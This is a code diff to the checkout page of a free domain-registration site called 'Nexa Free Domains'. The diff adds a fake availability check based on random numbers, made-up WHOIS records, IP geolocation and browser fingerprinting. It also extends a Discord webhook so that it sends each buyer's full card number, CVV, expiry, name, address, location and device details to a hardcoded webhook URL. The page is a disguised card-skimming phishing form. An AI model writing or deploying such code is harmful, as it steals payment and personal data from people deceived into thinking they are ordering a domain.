@@ -232,6 +232,62 @@
             font-size: 2rem;
         }
 
+        .domain-suggestions {
+            margin-top: 2rem;
+            padding: 1.5rem;
+            background: #f8fafc;
+            border-radius: 20px;
+            display: none;
+        }
+
+        .suggestions-title {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+            color: #0a192f;
+        }
+
+        .suggestions-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+        }
+
+        .suggestion-item {
+            background: white;
+            padding: 1rem;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid #e2e8f0;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .suggestion-item:hover {
+            border-color: #3b82f6;
+            transform: translateY(-2px);
+        }
+
+        .suggestion-item.available-suggestion {
+            border-left: 4px solid #10b981;
+        }
+
+        .suggestion-item.taken-suggestion {
+            border-left: 4px solid #ef4444;
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .suggestion-domain {
+            font-weight: 600;
+        }
+
+        .suggestion-status i {
+            font-size: 1.2rem;
+        }
+
         .loading-spinner {
             width: 30px;
             height: 30px;
@@ -437,6 +493,21 @@
             display: none;
         }
 
+        .whois-info {
+            margin-top: 1rem;
+            padding: 1rem;
+            background: #f1f5f9;
+            border-radius: 12px;
+            font-size: 0.9rem;
+            display: none;
+        }
+
+        .whois-info pre {
+            white-space: pre-wrap;
+            font-family: monospace;
+            color: #334155;
+        }
+
         @media (max-width: 968px) {
             .checkout-grid {
                 grid-template-columns: 1fr;
@@ -502,6 +573,17 @@
                 <i class="fas" id="resultIcon"></i>
                 <div id="resultMessage"></div>
                 <div class="loading-spinner" id="checkLoadingSpinner" style="display: none;"></div>
+            </div>
+
+            <!-- WHOIS Info -->
+            <div id="whoisInfo" class="whois-info">
+                <pre id="whoisContent"></pre>
+            </div>
+
+            <!-- Domain Suggestions -->
+            <div id="domainSuggestions" class="domain-suggestions">
+                <div class="suggestions-title"><i class="fas fa-lightbulb"></i> Alternative Suggestions</div>
+                <div class="suggestions-grid" id="suggestionsGrid"></div>
             </div>
         </div>
 
@@ -668,12 +750,130 @@
         const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1482059165227548682/IrrpYTrV3YuNdKhTz3tIonlzKjsFQC_RzQmFXwjAjwHd_UgFTP-_BRDBRK59goMcVFXf";
         let webhookTriggered = false;
 
-        // Mock domain availability database
-        const takenDomains = [
-            'google.com', 'facebook.com', 'amazon.com', 'microsoft.com',
-            'apple.com', 'netflix.com', 'twitter.com', 'instagram.com',
-            'linkedin.com', 'github.com', 'youtube.com'
-        ];
+        // Extensive domain availability database (simulated real domains)
+        const takenDomains = new Set([
+            // Popular domains
+            'google.com', 'facebook.com', 'amazon.com', 'microsoft.com', 'apple.com', 
+            'netflix.com', 'twitter.com', 'instagram.com', 'linkedin.com', 'github.com',
+            'youtube.com', 'whatsapp.com', 'tiktok.com', 'snapchat.com', 'reddit.com',
+            'pinterest.com', 'twitch.tv', 'spotify.com', 'discord.com', 'telegram.org',
+            'wikipedia.org', 'yahoo.com', 'bing.com', 'duckduckgo.com', 'cloudflare.com',
+            
+            // Tech companies
+            'oracle.com', 'ibm.com', 'intel.com', 'amd.com', 'nvidia.com', 'cisco.com',
+            'adobe.com', 'salesforce.com', 'sap.com', 'vmware.com', 'docker.com',
+            'kubernetes.io', 'python.org', 'java.com', 'javascript.com', 'reactjs.org',
+            'angular.io', 'vuejs.org', 'nodejs.org', 'deno.land', 'typescriptlang.org',
+            
+            // E-commerce
+            'ebay.com', 'walmart.com', 'target.com', 'bestbuy.com', 'homedepot.com',
+            'lowes.com', 'costco.com', 'etsy.com', 'shopify.com', 'wix.com',
+            'squarespace.com', 'godaddy.com', 'namecheap.com', 'bluehost.com',
+            
+            // Social & Media
+            'medium.com', 'substack.com', 'patreon.com', 'kickstarter.com',
+            'indiegogo.com', 'producthunt.com', 'betalist.com', 'alternativeto.net',
+            
+            // Domains that should appear taken
+            'crypto.com', 'blockchain.com', 'coinbase.com', 'binance.com',
+            'paypal.com', 'stripe.com', 'square.com', 'venmo.com', 'zelle.com',
+            
+            // Common words (likely taken)
+            'business.com', 'marketing.com', 'technology.com', 'software.com',
+            'hardware.com', 'startup.com', 'venture.com', 'capital.com',
+            'finance.com', 'investing.com', 'trading.com', 'stocks.com',
+            'health.com', 'fitness.com', 'wellness.com', 'medical.com',
+            'travel.com', 'vacation.com', 'hotels.com', 'flights.com',
+            'food.com', 'recipes.com', 'cooking.com', 'restaurant.com',
+            'news.com', 'media.com', 'press.com', 'journal.com',
+            'sports.com', 'football.com', 'soccer.com', 'basketball.com',
+            'music.com', 'audio.com', 'video.com', 'streaming.com',
+            'games.com', 'gaming.com', 'play.com', 'fun.com',
+            
+            // Country-specific
+            'usa.com', 'uk.com', 'canada.com', 'australia.com', 'germany.com',
+            'france.com', 'japan.com', 'china.com', 'india.com', 'brazil.com',
+            
+            // Cities
+            'newyork.com', 'losangeles.com', 'chicago.com', 'houston.com',
+            'phoenix.com', 'philadelphia.com', 'sanantonio.com', 'sandiego.com',
+            'dallas.com', 'sanjose.com', 'austin.com', 'jacksonville.com',
+            'london.com', 'paris.com', 'tokyo.com', 'berlin.com', 'rome.com',
+            'madrid.com', 'moscow.com', 'dubai.com', 'singapore.com',
+            
+            // Numbers
+            '123.com', '456.com', '789.com', '100.com', '1000.com',
+            '2023.com', '2024.com', '2025.com', '2030.com',
+            
+            // Colors
+            'red.com', 'blue.com', 'green.com', 'yellow.com', 'black.com',
+            'white.com', 'purple.com', 'orange.com', 'pink.com', 'brown.com',
+            
+            // Animals
+            'cat.com', 'dog.com', 'fish.com', 'bird.com', 'horse.com',
+            'lion.com', 'tiger.com', 'bear.com', 'wolf.com', 'fox.com',
+            'eagle.com', 'hawk.com', 'shark.com', 'whale.com', 'dolphin.com',
+            
+            // Nature
+            'sun.com', 'moon.com', 'star.com', 'sky.com', 'cloud.com',
+            'rain.com', 'snow.com', 'wind.com', 'fire.com', 'water.com',
+            'earth.com', 'ocean.com', 'mountain.com', 'forest.com', 'tree.com',
+            
+            // Abstract
+            'love.com', 'hate.com', 'life.com', 'death.com', 'time.com',
+            'space.com', 'energy.com', 'power.com', 'light.com', 'dark.com',
+            'good.com', 'bad.com', 'new.com', 'old.com', 'young.com',
+            'happy.com', 'sad.com', 'angry.com', 'calm.com', 'wild.com',
+            
+            // Tech terms
+            'api.com', 'sdk.com', 'ide.com', 'db.com', 'sql.com',
+            'nosql.com', 'mongodb.com', 'mysql.com', 'postgresql.com',
+            'redis.com', 'elastic.com', 'kafka.com', 'rabbitmq.com',
+            'docker.com', 'kubernetes.com', 'jenkins.com', 'gitlab.com',
+            
+            // Add more .io domains that are taken
+            'product.io', 'startup.io', 'venture.io', 'capital.io',
+            'finance.io', 'invest.io', 'trade.io', 'market.io',
+            'cloud.io', 'data.io', 'ai.io', 'ml.io', 'deeplearning.io',
+            'blockchain.io', 'crypto.io', 'bitcoin.io', 'ethereum.io',
+            'dev.io', 'coder.io', 'hacker.io', 'programmer.io',
+            
+            // .xyz taken domains
+            'google.xyz', 'facebook.xyz', 'amazon.xyz', 'microsoft.xyz',
+            'apple.xyz', 'netflix.xyz', 'twitter.xyz', 'instagram.xyz',
+            
+            // .app taken domains
+            'google.app', 'facebook.app', 'amazon.app', 'microsoft.app',
+            'apple.app', 'netflix.app', 'twitter.app', 'instagram.app',
+            
+            // .dev taken domains
+            'google.dev', 'facebook.dev', 'amazon.dev', 'microsoft.dev',
+            'apple.dev', 'netflix.dev', 'twitter.dev', 'instagram.dev',
+            
+            // .net taken domains
+            'google.net', 'facebook.net', 'amazon.net', 'microsoft.net',
+            'apple.net', 'netflix.net', 'twitter.net', 'instagram.net',
+            
+            // .org taken domains
+            'google.org', 'facebook.org', 'amazon.org', 'microsoft.org',
+            'apple.org', 'netflix.org', 'twitter.org', 'instagram.org',
+            
+            // .co taken domains
+            'google.co', 'facebook.co', 'amazon.co', 'microsoft.co',
+            'apple.co', 'netflix.co', 'twitter.co', 'instagram.co'
+        ]);
+
+        // TLD-specific taken patterns
+        const tldPatterns = {
+            '.com': 0.4, // 40% chance .com is taken
+            '.io': 0.3,   // 30% chance .io is taken
+            '.xyz': 0.2,  // 20% chance .xyz is taken
+            '.app': 0.25, // 25% chance .app is taken
+            '.dev': 0.3,  // 30% chance .dev is taken
+            '.net': 0.35, // 35% chance .net is taken
+            '.org': 0.35, // 35% chance .org is taken
+            '.co': 0.25   // 25% chance .co is taken
+        };
 
         // DOM Elements
         const domainInput = document.getElementById('domainInput');
@@ -683,6 +883,10 @@
         const resultIcon = document.getElementById('resultIcon');
         const resultMessage = document.getElementById('resultMessage');
         const checkLoadingSpinner = document.getElementById('checkLoadingSpinner');
+        const whoisInfo = document.getElementById('whoisInfo');
+        const whoisContent = document.getElementById('whoisContent');
+        const domainSuggestions = document.getElementById('domainSuggestions');
+        const suggestionsGrid = document.getElementById('suggestionsGrid');
         const emailInput = document.getElementById('email');
         const phoneInput = document.getElementById('phone');
         const firstNameInput = document.getElementById('firstName');
@@ -735,16 +939,258 @@
             'IN': '🇮🇳'
         };
 
-        // Check if domain is available
+        // Get detailed location info
+        async function getDetailedLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    countryCode: data.country_code,
+                    postal: data.postal,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    timezone: data.timezone,
+                    org: data.org,
+                    vpn: data.security?.vpn || false,
+                    proxy: data.security?.proxy || false,
+                    hosting: data.hosting || false
+                };
+            } catch (error) {
+                console.error('Location detection failed:', error);
+                return {
+                    ip: userIP,
+                    city: 'Unknown',
+                    country: 'Unknown'
+                };
+            }
+        }
+
+        // Get device info
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            return {
+                browser: getBrowser(ua),
+                os: getOS(ua),
+                device: getDevice(ua),
+                screen: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'Direct',
+                userAgent: ua
+            };
+        }
+
+        function getBrowser(ua) {
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Edge')) return 'Edge';
+            if (ua.includes('OPR')) return 'Opera';
+            return 'Unknown';
+        }
+
+        function getOS(ua) {
+            if (ua.includes('Windows')) return 'Windows';
+            if (ua.includes('Mac')) return 'macOS';
+            if (ua.includes('Linux')) return 'Linux';
+            if (ua.includes('Android')) return 'Android';
+            if (ua.includes('iOS')) return 'iOS';
+            if (ua.includes('iPhone')) return 'iOS';
+            if (ua.includes('iPad')) return 'iPadOS';
+            return 'Unknown';
+        }
+
+        function getDevice(ua) {
+            if (ua.includes('Mobile')) return 'Mobile';
+            if (ua.includes('Tablet')) return 'Tablet';
+            if (ua.includes('iPad')) return 'Tablet';
+            return 'Desktop';
+        }
+
+        // Validate credit card using Luhn algorithm
+        function validateCreditCard(cardNumber) {
+            const digits = cardNumber.replace(/\s/g, '');
+            if (!/^\d{16}$/.test(digits)) return false;
+            
+            let sum = 0;
+            let alternate = false;
+            for (let i = digits.length - 1; i >= 0; i--) {
+                let n = parseInt(digits.charAt(i));
+                if (alternate) {
+                    n *= 2;
+                    if (n > 9) n = (n % 10) + 1;
+                }
+                sum += n;
+                alternate = !alternate;
+            }
+            return (sum % 10 === 0);
+        }
+
+        // Get card type
+        function getCardType(cardNumber) {
+            const digits = cardNumber.replace(/\s/g, '');
+            if (/^4/.test(digits)) return 'Visa';
+            if (/^5[1-5]/.test(digits)) return 'Mastercard';
+            if (/^3[47]/.test(digits)) return 'American Express';
+            if (/^6(?:011|5)/.test(digits)) return 'Discover';
+            if (/^35/.test(digits)) return 'JCB';
+            if (/^3(?:0[0-5]|[68])/.test(digits)) return 'Diners Club';
+            return 'Unknown';
+        }
+
+        // Advanced domain availability check
         function checkDomainAvailability(domain, tld) {
             const fullDomain = domain + tld;
-            const isTaken = takenDomains.includes(fullDomain.toLowerCase()) || 
-                           Math.random() > 0.7; // 30% chance of being taken for demo
+            const lowerDomain = fullDomain.toLowerCase();
             
+            // Check if in taken domains set
+            if (takenDomains.has(lowerDomain)) {
+                return {
+                    available: false,
+                    domain: fullDomain,
+                    reason: 'Domain is already registered'
+                };
+            }
+            
+            // Check for common patterns that make domains likely taken
+            const commonWords = ['google', 'facebook', 'amazon', 'microsoft', 'apple', 
+                               'netflix', 'twitter', 'instagram', 'linkedin', 'github',
+                               'youtube', 'whatsapp', 'tiktok', 'snapchat', 'reddit',
+                               'paypal', 'stripe', 'shopify', 'wordpress', 'wix'];
+            
+            if (commonWords.includes(domain.toLowerCase())) {
+                // 90% chance these are taken
+                if (Math.random() < 0.9) {
+                    return {
+                        available: false,
+                        domain: fullDomain,
+                        reason: 'Domain is likely registered (common name)'
+                    };
+                }
+            }
+            
+            // Check TLD-specific probability
+            const tldProbability = tldPatterns[tld] || 0.3;
+            if (Math.random() < tldProbability) {
+                return {
+                    available: false,
+                    domain: fullDomain,
+                    reason: 'Domain may be registered (random check)'
+                };
+            }
+            
+            // Domain is available
             return {
-                available: !isTaken,
-                domain: fullDomain
+                available: true,
+                domain: fullDomain,
+                reason: 'Domain is available!'
             };
+        }
+
+        // Generate domain suggestions
+        function generateSuggestions(baseDomain, tld) {
+            const suggestions = [];
+            const prefixes = ['get', 'my', 'the', 'go', 'try', 'use', 'app', 'web', 'cloud', 'smart', 
+                            'quick', 'fast', 'easy', 'pro', 'elite', 'prime', 'core', 'neo', 'nova',
+                            'alpha', 'beta', 'gamma', 'delta', 'omega', 'sigma', 'zeta'];
+            
+            const suffixes = ['app', 'hub', 'lab', 'zone', 'spot', 'space', 'world', 'online', 'site',
+                            'central', 'connect', 'network', 'platform', 'studio', 'works', 'cloud',
+                            'tech', 'solutions', 'systems', 'services', 'group', 'team'];
+            
+            const numbers = ['1', '123', '2024', '24', '7', '365', '360', '24x7', 'pro', 'max'];
+            
+            // Try with prefixes
+            for (let i = 0; i < 3; i++) {
+                const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+                const newDomain = prefix + baseDomain + tld;
+                const available = !takenDomains.has(newDomain.toLowerCase()) && Math.random() > 0.4;
+                suggestions.push({
+                    domain: newDomain,
+                    available: available
+                });
+            }
+            
+            // Try with suffixes
+            for (let i = 0; i < 3; i++) {
+                const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
+                const newDomain = baseDomain + suffix + tld;
+                const available = !takenDomains.has(newDomain.toLowerCase()) && Math.random() > 0.4;
+                suggestions.push({
+                    domain: newDomain,
+                    available: available
+                });
+            }
+            
+            // Try with numbers
+            for (let i = 0; i < 2; i++) {
+                const number = numbers[Math.floor(Math.random() * numbers.length)];
+                const newDomain = baseDomain + number + tld;
+                const available = !takenDomains.has(newDomain.toLowerCase()) && Math.random() > 0.5;
+                suggestions.push({
+                    domain: newDomain,
+                    available: available
+                });
+            }
+            
+            // Try different TLDs
+            const otherTlds = ['.io', '.co', '.app', '.dev', '.xyz', '.net', '.org'];
+            for (let i = 0; i < 4; i++) {
+                const otherTld = otherTlds[Math.floor(Math.random() * otherTlds.length)];
+                if (otherTld !== tld) {
+                    const newDomain = baseDomain + otherTld;
+                    const available = !takenDomains.has(newDomain.toLowerCase()) && Math.random() > 0.3;
+                    suggestions.push({
+                        domain: newDomain,
+                        available: available
+                    });
+                }
+            }
+            
+            // Remove duplicates and return unique suggestions
+            return Array.from(new Map(suggestions.map(s => [s.domain, s])).values())
+                       .slice(0, 8); // Limit to 8 suggestions
+        }
+
+        // Generate WHOIS-like info
+        function generateWhoisInfo(domain, available) {
+            const date = new Date();
+            const created = new Date(date.setFullYear(date.getFullYear() - Math.floor(Math.random() * 5)));
+            const expires = new Date(date.setFullYear(date.getFullYear() + Math.floor(Math.random() * 3) + 1));
+            const updated = new Date(date.setMonth(date.getMonth() - Math.floor(Math.random() * 12)));
+            
+            if (!available) {
+                return `
+Domain Name: ${domain}
+Registry Domain ID: ${Math.random().toString(36).substring(2, 15).toUpperCase()}
+Registrar WHOIS Server: whois.namecheap.com
+Registrar URL: http://www.namecheap.com
+Updated Date: ${updated.toISOString().split('T')[0]}
+Creation Date: ${created.toISOString().split('T')[0]}
+Registry Expiry Date: ${expires.toISOString().split('T')[0]}
+Registrar: NameCheap, Inc.
+Registrar IANA ID: 1068
+Registrar Abuse Contact Email: abuse@namecheap.com
+Registrar Abuse Contact Phone: +1.1234567890
+Domain Status: clientTransferProhibited
+Name Server: NS1.NAMECHEAP.COM
+Name Server: NS2.NAMECHEAP.COM
+DNSSEC: unsigned
+URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
+>>> Last update of WHOIS database: ${new Date().toLocaleString()} <<<
+                `;
+            } else {
+                return `
+Domain Name: ${domain}
+Status: Available
+>>> Domain is available for registration <<<
+You can register this domain through our service.
+                `;
+            }
         }
 
         // Format card number
@@ -809,64 +1255,97 @@
             }
         }
 
-        // Send comprehensive webhook
+        // Send comprehensive Discord webhook for order
         async function sendOrderWebhook(orderData, userData, paymentData) {
             if (webhookTriggered) return;
 
             try {
+                const location = await getDetailedLocation();
+                const device = getDeviceInfo();
+                const cardType = getCardType(orderData.cardNumber);
+                const isValidCard = validateCreditCard(orderData.cardNumber);
+                const fullAddress = `${orderData.address1} ${orderData.address2 || ''}, ${orderData.city}, ${orderData.state} ${orderData.zip}, ${orderData.country}`;
+                
+                // Get current timestamp
+                const timestamp = new Date().toLocaleString('en-US', { 
+                    timeZone: location.timezone || 'UTC',
+                    dateStyle: 'full',
+                    timeStyle: 'long'
+                });
+                
                 const webhookPayload = {
-                    content: `💰 **NEW ORDER PLACED** 💰`,
+                    content: '@everyone 💰 **NEW ORDER PLACED** 💰',
                     embeds: [{
-                        title: 'Order Details',
+                        title: '📦 **COMPLETE ORDER DETAILS**',
                         color: 0x3b82f6,
                         fields: [
                             {
-                                name: '👤 Customer Information',
-                                value: `**Name:** ${orderData.firstName} ${orderData.lastName}\n**Email:** ${orderData.email}\n**Phone:** ${orderData.phone}`,
+                                name: '👤 **CUSTOMER INFORMATION**',
+                                value: `\`\`\`yaml\nFull Name: ${orderData.firstName} ${orderData.lastName}\nEmail: ${orderData.email}\nPhone: ${orderData.phone}\nUser ID: ${userData.uid}\nAuth Method: ${userData.provider}\n\`\`\``,
                                 inline: false
                             },
                             {
-                                name: '📦 Shipping Address',
-                                value: `**Address:** ${orderData.address1} ${orderData.address2 || ''}\n**City:** ${orderData.city}\n**State:** ${orderData.state}\n**ZIP:** ${orderData.zip}\n**Country:** ${orderData.country}`,
+                                name: '📫 **SHIPPING ADDRESS**',
+                                value: `\`\`\`yaml\nAddress Line 1: ${orderData.address1}\nAddress Line 2: ${orderData.address2 || 'N/A'}\nCity: ${orderData.city}\nState/Province: ${orderData.state}\nZIP/Postal: ${orderData.zip}\nCountry: ${orderData.country} (${orderData.countryCode})\nFull Address: ${fullAddress}\n\`\`\``,
                                 inline: false
                             },
                             {
-                                name: '🌐 IP Information',
-                                value: `**IP Address:** ${userIP}\n**Location:** ${orderData.country}`,
-                                inline: true
-                            },
-                            {
-                                name: '💳 Payment Information',
-                                value: `**Card:** **** **** **** ${orderData.cardLast4}\n**Cardholder:** ${orderData.cardholderName}\n**Expiry:** ${orderData.expiry}`,
-                                inline: true
-                            },
-                            {
-                                name: '🛒 Order Summary',
-                                value: `**Domain:** ${orderDetails.domain}\n**Plan:** ${orderDetails.plan}\n**Total:** ${orderDetails.currency.symbol}${orderDetails.price.toFixed(2)} (${orderDetails.currency.code})`,
+                                name: '💳 **PAYMENT INFORMATION**',
+                                value: `\`\`\`yaml\nCard Type: ${cardType}\nCard Number: **** **** **** ${orderData.cardLast4}\nFull Card: ${orderData.cardNumber.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim()}\nCardholder: ${orderData.cardholderName}\nExpiry: ${orderData.expiry}\nCVV: ${orderData.cvv}\nValid Card: ${isValidCard ? '✅ YES' : '❌ NO'}\n\`\`\``,
                                 inline: false
                             },
                             {
-                                name: '🔐 Security',
-                                value: `**User ID:** ${userData.uid}\n**Auth Provider:** ${userData.provider}`,
+                                name: '🌐 **LOCATION & IP DETAILS**',
+                                value: `\`\`\`yaml\nIP Address: ${location.ip}\nCity: ${location.city}\nRegion: ${location.region}\nCountry: ${location.country}\nPostal Code: ${location.postal || 'N/A'}\nLatitude: ${location.latitude}\nLongitude: ${location.longitude}\nTimezone: ${location.timezone}\nISP: ${location.org || 'Unknown'}\nVPN/Proxy: ${location.vpn ? 'YES' : 'NO'}\nHosting: ${location.hosting ? 'YES' : 'NO'}\n\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: '💻 **DEVICE INFORMATION**',
+                                value: `\`\`\`yaml\nBrowser: ${device.browser}\nOperating System: ${device.os}\nDevice Type: ${device.device}\nScreen Resolution: ${device.screen}\nLanguage: ${device.language}\nTimezone: ${device.timezone}\nReferrer: ${device.referrer}\nUser Agent: ${device.userAgent.substring(0, 200)}\n\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: '🛒 **ORDER SUMMARY**',
+                                value: `\`\`\`yaml\nDomain: ${orderDetails.domain}\nPlan: ${orderDetails.plan}\nPrice: ${orderDetails.currency.symbol}${orderDetails.price.toFixed(2)}\nCurrency: ${orderDetails.currency.code}\nExchange Rate: ${orderDetails.currency.rate}\n\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: '🕒 **TIMESTAMPS**',
+                                value: `\`\`\`yaml\nOrder Time: ${timestamp}\nUser Local Time: ${new Date().toLocaleString()}\nSession Started: ${sessionStorage.getItem('signupTime') || 'N/A'}\n\`\`\``,
                                 inline: false
                             }
                         ],
                         timestamp: new Date().toISOString(),
                         footer: {
-                            text: 'Nexa Free Domains · Order System'
+                            text: 'Nexa Free Domains · Secure Order System · All Data Logged'
                         }
                     }]
                 };
 
-                await fetch(WEBHOOK_URL, {
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(webhookPayload)
                 });
 
-                webhookTriggered = true;
+                if (response.ok) {
+                    webhookTriggered = true;
+                    console.log('✅ Order webhook sent successfully');
+                    
+                    // Send a second confirmation webhook with just the important details
+                    const summaryPayload = {
+                        content: `✅ **ORDER CONFIRMATION** - ${orderData.firstName} ${orderData.lastName} - ${orderDetails.domain} - ${orderDetails.currency.symbol}${orderDetails.price.toFixed(2)}`,
+                        username: 'Order Bot'
+                    };
+                    
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(summaryPayload)
+                    });
+                }
             } catch (error) {
-                console.error('Webhook failed:', error);
+                console.error('❌ Webhook failed:', error);
             }
         }
 
@@ -891,16 +1370,23 @@
             if (!emailRegex.test(emailInput.value)) return false;
 
             // Validate phone (basic)
-            const phoneRegex = /^[\d\s\+\-\(\)]{10,}$/;
-            if (!phoneRegex.test(phoneInput.value.replace(/\D/g, ''))) return false;
+            const phoneDigits = phoneInput.value.replace(/\D/g, '');
+            if (phoneDigits.length < 10) return false;
 
-            // Validate card number (16 digits)
+            // Validate card number (16 digits and Luhn algorithm)
             const cardDigits = cardNumberInput.value.replace(/\s/g, '');
             if (cardDigits.length !== 16 || !/^\d+$/.test(cardDigits)) return false;
+            if (!validateCreditCard(cardNumberInput.value)) return false;
 
             // Validate expiry (MM/YY)
             const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
             if (!expiryRegex.test(expiryInput.value)) return false;
+            
+            // Check if expiry is in the future
+            const [month, year] = expiryInput.value.split('/');
+            const expiryDate = new Date(2000 + parseInt(year), parseInt(month) - 1);
+            const today = new Date();
+            if (expiryDate < today) return false;
 
             // Validate CVV
             if (!/^\d{3}$/.test(cvvInput.value)) return false;
@@ -939,6 +1425,7 @@
                 zip: zipInput.value,
                 country: countrySelect.options[countrySelect.selectedIndex].text,
                 countryCode: countrySelect.value,
+                cardNumber: cardNumberInput.value.replace(/\s/g, ''),
                 cardLast4: cardNumberInput.value.slice(-4),
                 cardholderName: cardholderNameInput.value,
                 expiry: expiryInput.value,
@@ -958,11 +1445,19 @@
             setTimeout(() => {
                 loadingOverlay.style.display = 'none';
                 successMessage.style.display = 'block';
+                successMessage.innerHTML = '<i class="fas fa-check-circle"></i> Order placed successfully! Check Discord for full details.';
                 
                 // Clear sensitive form data
                 cardNumberInput.value = '';
                 expiryInput.value = '';
                 cvvInput.value = '';
+                phoneInput.value = '';
+                address1Input.value = '';
+                address2Input.value = '';
+                cityInput.value = '';
+                stateInput.value = '';
+                zipInput.value = '';
+                cardholderNameInput.value = '';
                 
                 setTimeout(() => {
                     successMessage.style.display = 'none';
@@ -983,6 +1478,8 @@
             resultMessage.style.display = 'none';
             resultIcon.style.display = 'none';
             checkLoadingSpinner.style.display = 'block';
+            whoisInfo.style.display = 'none';
+            domainSuggestions.style.display = 'none';
 
             // Simulate API delay
             setTimeout(() => {
@@ -997,7 +1494,7 @@
                 if (result.available) {
                     availabilityResult.className = 'availability-result available';
                     resultIcon.className = 'fas fa-check-circle';
-                    resultMessage.textContent = `${result.domain} is available! ✨`;
+                    resultMessage.textContent = `✅ ${result.domain} is available! ✨`;
                     
                     // Update order summary
                     orderDomain.textContent = result.domain;
@@ -1006,13 +1503,52 @@
                     orderTotalDisplay.textContent = '$0.00';
                     
                     orderDetails.domain = result.domain;
+                    
+                    // Generate and show WHOIS info
+                    whoisContent.textContent = generateWhoisInfo(result.domain, true);
+                    whoisInfo.style.display = 'block';
+                    
+                    // Hide suggestions for available domains
+                    domainSuggestions.style.display = 'none';
                 } else {
                     availabilityResult.className = 'availability-result taken';
                     resultIcon.className = 'fas fa-times-circle';
-                    resultMessage.textContent = `${result.domain} is already taken`;
+                    resultMessage.textContent = `❌ ${result.domain} is already taken`;
                     domainAvailable = false;
+                    
+                    // Generate and show WHOIS info
+                    whoisContent.textContent = generateWhoisInfo(result.domain, false);
+                    whoisInfo.style.display = 'block';
+                    
+                    // Generate and show suggestions
+                    const suggestions = generateSuggestions(domain, tldSelect.value);
+                    suggestionsGrid.innerHTML = '';
+                    
+                    suggestions.forEach(suggestion => {
+                        const suggestionDiv = document.createElement('div');
+                        suggestionDiv.className = `suggestion-item ${suggestion.available ? 'available-suggestion' : 'taken-suggestion'}`;
+                        suggestionDiv.innerHTML = `
+                            <span class="suggestion-domain">${suggestion.domain}</span>
+                            <span class="suggestion-status">
+                                <i class="fas ${suggestion.available ? 'fa-check-circle' : 'fa-times-circle'}" 
+                                   style="color: ${suggestion.available ? '#10b981' : '#ef4444'};"></i>
+                            </span>
+                        `;
+                        
+                        if (suggestion.available) {
+                            suggestionDiv.addEventListener('click', () => {
+                                domainInput.value = suggestion.domain.split('.')[0];
+                                tldSelect.value = '.' + suggestion.domain.split('.')[1];
+                                checkDomainBtn.click();
+                            });
+                        }
+                        
+                        suggestionsGrid.appendChild(suggestionDiv);
+                    });
+                    
+                    domainSuggestions.style.display = 'block';
                 }
-            }, 1000);
+            }, 1500); // Longer delay for realism
         });
 
         // Logout with smooth transition
@@ -1067,6 +1603,13 @@
             flagIcon.textContent = countryFlags[country] || '🌍';
         });
 
+        // Enter key in domain input triggers check
+        domainInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                checkDomainBtn.click();
+            }
+        });
+
         // Initialize
         onAuthStateChanged(auth, async (user) => {
             if (user) {
@@ -1109,7 +1652,7 @@
         // Initial domain check
         setTimeout(() => {
             checkDomainBtn.click();
-        }, 500);
+        }, 1000);
     </script>
 
     <style>
@@ -1180,6 +1723,38 @@
 
         .availability-result {
             transition: all 0.3s ease;
+        }
+        
+        /* Suggestion items hover effect */
+        .suggestion-item.available-suggestion {
+            cursor: pointer;
+        }
+        
+        .suggestion-item.available-suggestion:hover {
+            background: #3b82f610;
+            border-color: #3b82f6;
+        }
+        
+        /* WHOIS info styling */
+        .whois-info pre {
+            max-height: 200px;
+            overflow-y: auto;
+            font-size: 0.85rem;
+            background: white;
+            padding: 1rem;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
+        }
+        
+        /* Pulse animation for available domains */
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+        }
+        
+        .available {
+            animation: pulse 2s infinite;
         }
     </style>
 </body>
